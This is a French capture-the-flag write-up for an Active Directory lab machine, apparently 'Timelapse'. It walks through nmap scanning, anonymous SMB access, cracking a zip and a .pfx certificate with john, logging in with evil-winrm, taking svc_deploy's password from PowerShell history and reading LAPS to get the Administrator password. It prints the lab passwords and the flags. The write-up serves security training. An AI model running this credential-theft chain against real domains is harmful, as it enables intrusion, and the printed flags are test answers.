# Target : 10.129.227.113

# Enumeration des Ports et services

```js
nmap -sV -sC -Pn 10.129.227.113 -A -O
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-21 20:52 +0000
Nmap scan report for 10.129.227.113
Host is up (0.25s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-07-22 04:52:49Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/wsmans?
|_ssl-date: 2026-07-22T04:55:07+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|   h2
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-time: 
|   date: 2026-07-22T04:54:26
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   136.30 ms 10.10.14.1
2   137.56 ms 10.129.227.113

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.47 seconds
```

Domaine : `timelapse.htb`

## SMB Enumeration

```js
smbclient -N -L //10.129.227.113/
```

#### Tips
![](/assets/IMG-20260721211710627.png)

#Pourquoi smbclient a fonctionner et non netexec ?

**`smbclient -N -L`** : Cette commande tente d'énumérer les partages en utilisant une session "anonyme" pure. Dans certains cas ou selon la configuration des IPC, Windows accepte de lister les noms de partages de base, mais bloque les accès plus profonds.

**`nxc smb ... -u '' -p '' --shares`** : NetExec (nxc) utilise l'API RPC (`srvsvc`) pour énumérer les partages de manière propre et détaillée (incluant les permissions de lecture/écriture). Le serveur Windows intercepte cette requête RPC via la session nulle et répond par un **`STATUS_ACCESS_DENIED`** car un utilisateur non authentifié n'a pas le droit d'interroger cette API.


## Connexion au partage SMB

```js
smbclient -N  //10.129.227.113/Shares
```

![](/assets/IMG-20260721212217769.png)

### Found

`winrm_backup.zip`

## Crackage du ficher .zip trouver

```js
john crackme --wordlist=/usr/share/wordlists/rockyou.txt
```

```js
pass : supremelegacy
```

## Crackage du ficher .pfx trouver en dezipper le ficher precedant

```js
pfx2john legacyy_dev_auth.pfx > crackme
```

```js
pass : thuglegacy
```

![](/assets/IMG-20260721213145834.png)
## Extraction des Cle et certificats

### Certificats

```js
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
```
### Cle 

```js
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out legacyy.key
```


## Connexion via Evil-WinRm

```js
evil-winrm -c legacyy.crt -k legacyy.key -i 10.129.227.113 -S
```

- **`-c`** : Spécifie le certificat de Legacyy.
- **`-pkey`** : Spécifie la clé RSA privée de 2048 bits visible sur votre image.
- **`-S`** : Active le SSL/TLS (nécessaire pour l'authentification par certificat).
![](/assets/IMG-20260721213957450.png)

# User Flag : 1f711172db2ae7ba02d4d52bce7a6df0

## Privilege Escalation

### Lecture de l'history a partir de $env:

```js
cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
```

![](/assets/IMG-20260721215340085.png)

```js
user : svc_deploy | pass : E3R$Q62^12p7PLlC%KWaxuaV
```

## Connexion au compte avec l'user svc_deploy

```js
evil-winrm -i 10.129.227.113 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```


Notre User appartient au groupe LAPS_READERS

![](/assets/IMG-20260721225103354.png)

```js
Ce groupe indique que l'utilisateur `svc_deploy` possède les droits nécessaires pour lire les attributs de **LAPS** (Local Administrator Password Solution) au sein de l'Active Directory. LAPS est un outil de Microsoft qui gère et change automatiquement les mots de passe des comptes **Administrateur local** des machines du domaine, puis stocke ces mots de passe en clair dans un attribut protégé de l'Active Directory. [[1](https://www.starwindsoftware.com/blog/deploying-microsoft-laps/), [2](https://haydog.tech.blog/2019/11/04/microsoft-local-administrator-password-solution-part-1-deployment-considerations/), [3](https://community.spiceworks.com/t/group-policy-to-set-up-laps/1114049)]
```

```js
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd
```

```js
Name  ms-Mcs-AdmPwd
----  -------------
DC01  .asxc-x11gkL28Pt+F9MRi3Q
DB01
WEB01
DEV01
```

## Connexion au compte Administrateur avec le mot de passe trouver

```js
evil-winrm -i 10.129.227.113 -u 'administrator' -p '.asxc-x11gkL28Pt+F9MRi3Q' -S
```

# Root Flag : 809de5cfc26e4a780485e404aeea0104